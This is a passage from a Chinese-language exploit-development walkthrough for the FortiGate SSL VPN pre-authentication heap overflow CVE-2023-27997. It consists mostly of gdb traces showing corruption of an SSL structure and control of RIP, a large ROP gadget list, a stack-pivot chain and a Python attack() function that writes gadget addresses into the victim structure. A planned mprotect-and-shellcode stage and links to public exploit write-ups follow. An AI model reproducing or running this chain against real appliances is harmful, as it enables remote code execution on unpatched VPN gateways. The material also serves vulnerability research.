Breakpoint 1, 0x00007f07155d8935 in SSL_new () from /usr/lib/x86_64-linux-gnu/libssl.so.1.1
ssl alloc addr:0x7f070ff75800

Breakpoint 1, 0x00007f07155d8935 in SSL_new () from /usr/lib/x86_64-linux-gnu/libssl.so.1.1
ssl alloc addr:0x7f070ff77400

Breakpoint 1, 0x00007f07155d8935 in SSL_new () from /usr/lib/x86_64-linux-gnu/libssl.so.1.1
ssl alloc addr:0x7f070ff99000

Breakpoint 1, 0x00007f07155d8935 in SSL_new () from /usr/lib/x86_64-linux-gnu/libssl.so.1.1
ssl alloc addr:0x7f070ff9ac00

Breakpoint 1, 0x00007f07155d8935 in SSL_new () from /usr/lib/x86_64-linux-gnu/libssl.so.1.1
ssl alloc addr:0x7f070ff9c800

Breakpoint 1, 0x00007f07155d8935 in SSL_new () from /usr/lib/x86_64-linux-gnu/libssl.so.1.1
ssl alloc addr:0x7f070ff9e400

Breakpoint 1, 0x00007f07155d8935 in SSL_new () from /usr/lib/x86_64-linux-gnu/libssl.so.1.1
ssl alloc addr:0x7f070ffa0000

Breakpoint 1, 0x00007f07155d8935 in SSL_new () from /usr/lib/x86_64-linux-gnu/libssl.so.1.1
ssl alloc addr:0x7f070ffa1c00

Breakpoint 1, 0x00007f07155d8935 in SSL_new () from /usr/lib/x86_64-linux-gnu/libssl.so.1.1
ssl alloc addr:0x7f070ffa3800

Breakpoint 1, 0x00007f07155d8935 in SSL_new () from /usr/lib/x86_64-linux-gnu/libssl.so.1.1
ssl alloc addr:0x7f070fed4400

Breakpoint 1, 0x00007f07155d8935 in SSL_new () from /usr/lib/x86_64-linux-gnu/libssl.so.1.1
ssl alloc addr:0x7f070fed2800

Breakpoint 2, 0x000000000164e1fe in ?? ()
enc alloc addr:0x7f070fed0c18

Breakpoint 3, 0x000000000164e35f in ?? ()
write 0x7f070fed2830 to zero
SSL init_flag:0
SSL handshake_func:0x7f07155eb9c0

Breakpoint 2, 0x000000000164e1fe in ?? ()
enc alloc addr:0x7f070fed0c18

Breakpoint 3, 0x000000000164e35f in ?? ()
write 0x7f070fed2831 to zero
SSL init_flag:0
SSL handshake_func:0x7f07155eb9ff

Breakpoint 2, 0x000000000164e1fe in ?? ()
enc alloc addr:0x7f070fed0c18

Breakpoint 3, 0x000000000164e35f in ?? ()
write 0x7f070fed2831 to zero
SSL init_flag:0
SSL handshake_func:0x7f07155e0020

Breakpoint 2, 0x000000000164e1fe in ?? ()
enc alloc addr:0x7f070fed0c18

Breakpoint 3, 0x000000000164e35f in ?? ()
write 0x7f070fed2832 to zero
SSL init_flag:0
SSL handshake_func:0x7f07155effff

Breakpoint 2, 0x000000000164e1fe in ?? ()
enc alloc addr:0x7f070fed0c18

Breakpoint 3, 0x000000000164e35f in ?? ()
write 0x7f070fed2832 to zero
SSL init_flag:0
SSL handshake_func:0x7f07150008d6

Breakpoint 2, 0x000000000164e1fe in ?? ()
enc alloc addr:0x7f070fed0c18

Breakpoint 3, 0x000000000164e35f in ?? ()
write 0x7f070fed2833 to zero
SSL init_flag:0
SSL handshake_func:0x7f0715ffffff

Breakpoint 2, 0x000000000164e1fe in ?? ()
enc alloc addr:0x7f070fed0c18

Breakpoint 3, 0x000000000164e35f in ?? ()
write 0x7f070fed2833 to zero
SSL init_flag:0
SSL handshake_func:0x7f0700f381fa

Breakpoint 2, 0x000000000164e1fe in ?? ()
enc alloc addr:0x7f070fed0c18

Breakpoint 3, 0x000000000164e35f in ?? ()
write 0x7f070fed2834 to zero
SSL init_flag:0
SSL handshake_func:0x7f07ffffffff

Breakpoint 2, 0x000000000164e1fe in ?? ()
enc alloc addr:0x7f070fed0c18

Breakpoint 3, 0x000000000164e35f in ?? ()
write 0x7f070fed2834 to zero
SSL init_flag:0
SSL handshake_func:0x7f00c660cb1c

Breakpoint 2, 0x000000000164e1fe in ?? ()
enc alloc addr:0x7f070fed0c18

Breakpoint 3, 0x000000000164e35f in ?? ()
write 0x7f070fed2835 to zero
SSL init_flag:0
SSL handshake_func:0x7fffffffffff

Breakpoint 2, 0x000000000164e1fe in ?? ()
enc alloc addr:0x7f070fed0c18

Breakpoint 3, 0x000000000164e35f in ?? ()
write 0x7f070fed2835 to zero
SSL init_flag:0
SSL handshake_func:0x479921a234

Breakpoint 2, 0x000000000164e1fe in ?? ()
enc alloc addr:0x7f070fed0c18

Breakpoint 3, 0x000000000164e35f in ?? ()
write 0x7f070fed2836 to zero
SSL init_flag:0
SSL handshake_func:0xffffffffffff

Breakpoint 2, 0x000000000164e1fe in ?? ()
enc alloc addr:0x7f070fed0c18

Breakpoint 3, 0x000000000164e35f in ?? ()
write 0x7f070fed2836 to zero
SSL init_flag:0
SSL handshake_func:0xec81e0e4bd84

Breakpoint 2, 0x000000000164e1fe in ?? ()
enc alloc addr:0x7f070fed0c18

Breakpoint 3, 0x000000000164e35f in ?? ()
write 0x7f070fed2837 to zero
SSL init_flag:0
SSL handshake_func:0xffffffffffffff

Breakpoint 2, 0x000000000164e1fe in ?? ()
enc alloc addr:0x7f070fed0c18

Breakpoint 3, 0x000000000164e35f in ?? ()
write 0x7f070fed2864 to zero
SSL init_flag:0
SSL handshake_func:0x6b437a509f596b94

Breakpoint 2, 0x000000000164e1fe in ?? ()
enc alloc addr:0x7f070fed0c18

Breakpoint 3, 0x000000000164e35f in ?? ()
write 0x7f070fed2865 to zero
SSL init_flag:1
SSL handshake_func:0xffffffffffffff

Program received signal SIGSEGV, Segmentation fault.
0x00007f07155bf563 in ?? () from /usr/lib/x86_64-linux-gnu/libssl.so.1.1
```

查看崩溃原因：

```
Program received signal SIGSEGV, Segmentation fault.
0x00007f07155bf563 in ?? () from /usr/lib/x86_64-linux-gnu/libssl.so.1.1
(gdb) print /x $rip
$1 = 0x7f07155bf563
(gdb) x /10i 0x00007f07155bf563
=> 0x7f07155bf563:	call   *0x30(%rbp)
   0x7f07155bf566:	mov    %eax,%r10d
   0x7f07155bf569:	test   %eax,%eax
   0x7f07155bf56b:	js     0x7f07155bf3fd
   0x7f07155bf571:	jne    0x7f07155bf343
   0x7f07155bf577:	jmp    0x7f07155bf3f7
   0x7f07155bf57c:	nopl   0x0(%rax)
   0x7f07155bf580:	mov    0x10(%rsp),%rsi
   0x7f07155bf585:	lea    0x17a0(%rbp),%rcx
   0x7f07155bf58c:	xor    %edx,%edx
(gdb) x /1xg ($rbp+0x30)
0x7f070fed2830:	0x00ffffffffffffff

```

ok，成功控制rip。查看寄存器参数：

```
(gdb) info registers 
rax            0x1                 1
rbx            0x0                 0
rcx            0x7f0711441780      139668331173760
rdx            0x0                 0
rsi            0x0                 0
rdi            0x7f070fed2800      139668308699136
rbp            0x7f070fed2800      0x7f070fed2800
rsp            0x7fff5b0d6390      0x7fff5b0d6390
r8             0x7f0711441780      139668331173760
r9             0xfffffffffffffff0  -16
r10            0x6                 6
r11            0x246               582
r12            0x7f070fee3000      139668308766720
r13            0x17                23
r14            0x0                 0
r15            0x2000              8192
rip            0x7f07155bf563      0x7f07155bf563
eflags         0x10202             [ IF RF ]
cs             0x33                51
ss             0x2b                43
ds             0x0                 0
es             0x0                 0
fs             0x0                 0
gs             0x0                 0
fs_base        0x7f0711442fc0      139668331179968
gs_base        0x0                 0
```

0x7f070fed2800 为victim_sock 的 SSL 结构体，也就是被我们修改的SSL结构体。可以知道rdi，rbp也是指向该结构体的。

0x7f070fed0c18 为enc分配的内存

### rop 构造

首先修改victim_sock 的 SSL 结构体的handshake_func 为 0x00000000007cfb34

```
sysirq@sysirq-machine:~/FortiGate_7_2_0/rootfs$ cat ropchain | grep -E "push rdi"  | grep -E "pop rsp"
```

```
0x00000000007cfb34 : push rdi ; pop rsp ; ret
```

将栈迁移到victim_sock的SSL结构体的开头(SSL + 0x0000)。



搜索半天，并没有找到通过sub rsp，将栈迁移到前面enc 分配内存的地方。尝试在SSL结构体中构建下一个gadget？

```c
0x000000000294a2e6 : add rsp, 0x10 ; leave ; ret
0x00000000029f0607 : add rsp, 0x10 ; mov eax, ebx ; pop rbx ; ret
0x0000000002ac0ea3 : add rsp, 0x10 ; nop ; leave ; ret
0x0000000000508e42 : add rsp, 0x10 ; pop r12 ; pop r13 ; pop rbp ; ret
0x0000000000f7a126 : add rsp, 0x10 ; pop r13 ; pop r14 ; pop rbp ; ret
0x000000000045167f : add rsp, 0x10 ; pop rbx ; pop r12 ; pop rbp ; ret
0x00000000004c6a29 : add rsp, 0x10 ; pop rbx ; pop r13 ; pop rbp ; ret
0x000000000076f9c0 : add rsp, 0x10 ; pop rbx ; pop r14 ; pop rbp ; ret
0x00000000029fc74a : add rsp, 0x10 ; pop rbx ; pop rbp ; pop r12 ; ret
0x0000000000443e8d : add rsp, 0x10 ; pop rbx ; ret
0x0000000002a02f22 : add rsp, 0x10 ; xor eax, eax ; pop rbx ; ret
0x0000000002b51505 : add rsp, 0x108 ; ret
0x00000000029609bd : add rsp, 0x1098 ; pop rbx ; pop rbp ; ret
0x0000000002a22bab : add rsp, 0x118 ; pop rbx ; pop rbp ; ret
0x0000000002a25e03 : add rsp, 0x130 ; pop rbx ; ret
0x0000000002a00e16 : add rsp, 0x138 ; ret
0x00000000029fffaf : add rsp, 0x148 ; ret
0x0000000002a001ff : add rsp, 0x168 ; ret
0x0000000002b34211 : add rsp, 0x178 ; pop rbx ; pop rbp ; ret
0x0000000002a005fb : add rsp, 0x178 ; ret
0x0000000002b3d1f9 : add rsp, 0x18 ; and eax, 0x2b ; ret
0x0000000002b0cb71 : add rsp, 0x18 ; mov eax, edx ; pop rbx ; pop rbp ; ret
0x00000000029fc103 : add rsp, 0x18 ; mov rax, rcx ; ret
0x00000000029569ff : add rsp, 0x18 ; pop rbx ; pop rbp ; ret
0x00000000029efa91 : add rsp, 0x18 ; ret
0x0000000002a082f2 : add rsp, 0x18 ; xor eax, eax ; pop rbx ; pop rbp ; ret
0x0000000002b294b1 : add rsp, 0x20 ; add rsp, 8 ; ret
0x0000000000476aa7 : add rsp, 0x20 ; leave ; ret
0x0000000002520207 : add rsp, 0x20 ; leave ; xor eax, eax ; ret
0x0000000000694f24 : add rsp, 0x20 ; mov r12, qword ptr [rbp - 8] ; leave ; ret
0x00000000004b1364 : add rsp, 0x20 ; mov rbx, qword ptr [rbp - 8] ; leave ; ret
0x00000000004e86b6 : add rsp, 0x20 ; pop r12 ; pop r13 ; pop rbp ; ret
0x000000000156fbfd : add rsp, 0x20 ; pop r13 ; pop r14 ; pop rbp ; ret
0x000000000044b2e3 : add rsp, 0x20 ; pop rbx ; pop r12 ; pop rbp ; ret
0x00000000029ffc50 : add rsp, 0x20 ; pop rbx ; pop rbp ; pop r12 ; ret
0x0000000002a038ec : add rsp, 0x20 ; pop rbx ; ret
0x000000000068e173 : add rsp, 0x20 ; xor eax, eax ; leave ; ret
0x0000000002a01b1d : add rsp, 0x20 ; xor eax, eax ; pop rbx ; ret
0x0000000002b65eab : add rsp, 0x2038 ; pop rbx ; pop rbp ; ret
0x0000000002b63eae : add rsp, 0x2048 ; pop rbx ; pop rbp ; ret
0x0000000002a25815 : add rsp, 0x218 ; pop rbx ; pop rbp ; ret
0x0000000002947cf7 : add rsp, 0x28 ; pop rbx ; pop rbp ; ret
0x00000000029fb742 : add rsp, 0x28 ; ret
0x000000000060acca : add rsp, 0x30 ; leave ; ret
0x0000000000684f8f : add rsp, 0x30 ; mov r12, qword ptr [rbp - 8] ; leave ; ret
0x000000000044f47f : add rsp, 0x30 ; pop r12 ; pop r13 ; pop rbp ; ret
0x000000000046020a : add rsp, 0x30 ; pop rbx ; pop r12 ; pop rbp ; ret
0x0000000002a06184 : add rsp, 0x30 ; pop rbx ; pop rbp ; pop r12 ; ret
0x00000000029fce72 : add rsp, 0x30 ; pop rbx ; ret
0x0000000000739fa5 : add rsp, 0x30 ; xor eax, eax ; leave ; ret
0x0000000002954717 : add rsp, 0x38 ; pop rbx ; pop rbp ; ret
0x0000000002a0cbe0 : add rsp, 0x38 ; ret
0x00000000006fe990 : add rsp, 0x40 ; leave ; ret
0x000000000046cfe6 : add rsp, 0x40 ; pop r12 ; pop r13 ; pop rbp ; ret
0x0000000000460a0d : add rsp, 0x40 ; pop rbx ; pop r12 ; pop rbp ; ret
0x00000000018ec468 : add rsp, 0x40 ; pop rbx ; pop r13 ; pop rbp ; ret
0x0000000002a29692 : add rsp, 0x40 ; pop rbx ; pop rbp ; pop r12 ; ret
0x0000000002a1af1f : add rsp, 0x40 ; pop rbx ; ret
0x0000000000b35bc1 : add rsp, 0x40 ; xor eax, eax ; leave ; ret
0x000000000297177f : add rsp, 0x468 ; pop rbx ; pop rbp ; ret
0x000000000294fc5d : add rsp, 0x48 ; pop rbx ; pop rbp ; ret
0x0000000002b1dacb : add rsp, 0x48 ; ret
0x000000000049016b : add rsp, 0x50 ; leave ; ret
0x0000000000640c76 : add rsp, 0x50 ; mov r12, qword ptr [rbp - 8] ; leave ; ret
0x0000000000a60e52 : add rsp, 0x50 ; pop r12 ; pop r13 ; pop rbp ; ret
0x000000000055ee39 : add rsp, 0x50 ; pop rbx ; pop r12 ; pop rbp ; ret
0x0000000002a01772 : add rsp, 0x50 ; pop rbx ; pop rbp ; pop r12 ; ret
0x0000000002a13d8e : add rsp, 0x50 ; pop rbx ; ret
0x0000000002a0ca40 : add rsp, 0x58 ; pop rbx ; pop rbp ; ret
0x0000000002a087b2 : add rsp, 0x58 ; ret
0x00000000008ef588 : add rsp, 0x60 ; leave ; ret
0x00000000008847f7 : add rsp, 0x60 ; pop r12 ; pop r13 ; pop rbp ; ret
0x00000000004ac601 : add rsp, 0x60 ; pop rbx ; pop r12 ; pop rbp ; ret
0x0000000000fdb32b : add rsp, 0x60 ; pop rbx ; pop r14 ; pop rbp ; ret
0x0000000002b083f6 : add rsp, 0x60 ; pop rbx ; pop rbp ; pop r12 ; ret
0x0000000002966643 : add rsp, 0x68 ; pop rbx ; pop rbp ; ret
0x0000000001ab04cc : add rsp, 0x70 ; leave ; ret
0x0000000000898c3d : add rsp, 0x70 ; pop r12 ; pop r13 ; pop rbp ; ret
0x0000000000836a73 : add rsp, 0x70 ; pop rbx ; pop r12 ; pop rbp ; ret
0x0000000002a01cb9 : add rsp, 0x70 ; pop rbx ; pop rbp ; pop r12 ; ret
0x0000000002a0c937 : add rsp, 0x70 ; pop rbx ; ret
0x0000000002b5251b : add rsp, 0x78 ; mov eax, ebp ; pop rbx ; pop rbp ; ret
0x0000000002a96845 : add rsp, 0x78 ; pop rbx ; pop rbp ; ret
0x000000000296e686 : add rsp, 0x88 ; pop rbx ; pop rbp ; ret
0x0000000002a26ae0 : add rsp, 0x90 ; pop rbx ; ret
0x0000000002965f56 : add rsp, 0x98 ; pop rbx ; pop rbp ; ret
0x00000000028042d3 : add rsp, 0xa0 ; leave ; ret
0x0000000002a22680 : add rsp, 0xa0 ; pop rbx ; ret
0x000000000296375c : add rsp, 0xa8 ; pop rbx ; pop rbp ; ret
0x0000000002954523 : add rsp, 0xb8 ; pop rbx ; pop rbp ; ret
0x0000000002a29804 : add rsp, 0xc0 ; pop rbx ; ret
0x0000000002b06366 : add rsp, 0xc8 ; ret
0x0000000002a1f67d : add rsp, 0xd0 ; pop rbx ; ret
0x0000000002a2d51d : add rsp, 0xd8 ; pop rbx ; pop rbp ; ret
0x0000000002a22c6e : add rsp, 0xd8 ; ret
0x0000000002b4ed4e : add rsp, 0xe0 ; pop rbx ; ret
0x0000000002a26c31 : add rsp, 0xe8 ; pop rbx ; pop rbp ; ret
0x0000000002b106a6 : add rsp, 0xe8 ; ret
```

尝试将SSL + 0x0000 的值设置为0x000000000297177f

```
0x000000000297177f : add rsp, 0x468 ; pop rbx ; pop rbp ; ret
```

执行之后：我们的栈到SSL + 0x0480



此时rdi仍然指向分配的victim_sock SSL结构体的开头。在SSL + 0x0480构建如下的内存结构

```
0x0000000000443a00 : xor eax, eax ; pop rbx ; ret
0x0000000000001BE2 :
0x000000000047882f : nop ; mov rax, rdi ; ret
0x00000000028332fe : sub rax, rbx ; pop rbx ; pop r12 ; pop r13 ; pop rbp ; ret
8字节不需要修改的数据 :
8字节不需要修改的数据 :
8字节不需要修改的数据 :
8字节不需要修改的数据 :
0x000000000079d07e : push rax ; pop rdi ; ret
0x00000000007cfb34 : push rdi ; pop rsp ; ret
```

0x0000000000001BE2，为victim_sock 的SSL 结构体开始地址 减去 enc分配内存的地址，在减去6字节， 此时将栈迁移到enc分配的内存+6的地址（跳过4字节的seed ， 2字节的size）

Python 代码

```python
def attack(sock,salt):
    # set handshake_func function
    # rdi , rbp point to victim_sock ssl struct begin point
    # 0x00000000007cfb34 : push rdi ; pop rsp ; ret
    # MSB is 0, so no need to write it 
    write_bytes(sock,0x30,bytes([0x34,0xfb,0x7c,0x00,0x00,0x00,0x00]),salt)

    # Overwrite s->version , SSL + 0x00
    # 0x000000000297177f : add rsp, 0x468 ; pop rbx ; pop rbp ; ret
    write_bytes(sock,0x00,bytes([0x7f,0x17,0x97,0x02,0x00,0x00,0x00]),salt)

    # now rsp point to SSL struct offset 0x480
    # rdi still point ssl struct begin point

    # 0x0000000000443a00 : xor eax, eax ; pop rbx ; ret
    write_bytes(sock,0x480,bytes([0x00,0x3a,0x44,0x00,0x00,0x00,0x00]),salt)

    # 0x1BE2: victim_sock SSL struct begin addr  - 0x1BE2 == enc alloc data ,user data offset
    write_bytes(sock,0x488,bytes([0xE2,0x1B,0x00,0x00,0x00,0x00,0x00]),salt)

    # 0x000000000047882f : nop ; mov rax, rdi ; ret
    write_bytes(sock,0x490,bytes([0x2f,0x88,0x47,0x00,0x00,0x00,0x00]),salt)

    # 0x00000000028332fe : sub rax, rbx ; pop rbx ; pop r12 ; pop r13 ; pop rbp ; ret  
    write_bytes(sock,0x498,bytes([0xfe,0x32,0x83,0x02,0x00,0x00,0x00]),salt)

    # 0x000000000079d07e : push rax ; pop rdi ; ret
    write_bytes(sock,0x4C0,bytes([0x7e,0xd0,0x79,0x00,0x00,0x00,0x00]),salt)

    # 0x00000000007cfb34 : push rdi ; pop rsp ; ret
    write_bytes(sock,0x4C8,bytes([0x34,0xfb,0x7c,0x00,0x00,0x00,0x00]),salt)

    # set ssl->statem.in_init
    write_bytes(sock,0x64,bytes([0x1]),salt)
```

此时查看gdb发现如下：

```
rdi            0x7f070fed0c1e      139668308691998
rbp            0x0                 0x0
rsp            0x7f070fed0c1e      0x7f070fed0c1e
```

已经成功修改。（后面要考虑内存对齐问题哦）

#### shell code

mprotect + shellcode

```
SYNOPSIS
       #include <sys/mman.h>

       int mprotect(void *addr, size_t len, int prot);

       #define _GNU_SOURCE             /* See feature_test_macros(7) */
       #include <sys/mman.h>

       int pkey_mprotect(void *addr, size_t len, int prot, int pkey);
DESCRIPTION
       mprotect()  changes  the  access  protections  for  the  calling  process's  memory  pages  containing  any part of the address range in the interval [addr, addr+len-1].  addr must be aligned to a page boundary.
```

```
rdi = 7 
rsi = 0x5000 
rdx = ALIGNED_ADDRESS
```

```
0x0000000000443bae : pop rdi ; ret
0x0000000000443f28 : pop rsi ; ret
0x00000000004442d5 : pop rdx ; ret
```



# 资料

XORtigate: Pre-authentication Remote Code Execution on Fortigate VPN (CVE-2023-27997)

https://blog.lexfo.fr/xortigate-cve-2023-27997.html

xortigate-cve-2023-27997

https://github.com/lexfo/xortigate-cve-2023-27997

Attacking SSL VPN - Part 2: Breaking the Fortigate SSL VPN

https://devco.re/blog/2019/08/09/attacking-ssl-vpn-part-2-breaking-the-Fortigate-ssl-vpn/#:~:text=HTTP%20server:

Building an Exploit for FortiGate Vulnerability CVE-2023-27997

https://bishopfox.com/blog/building-exploit-fortigate-vulnerability-cve-2023-27997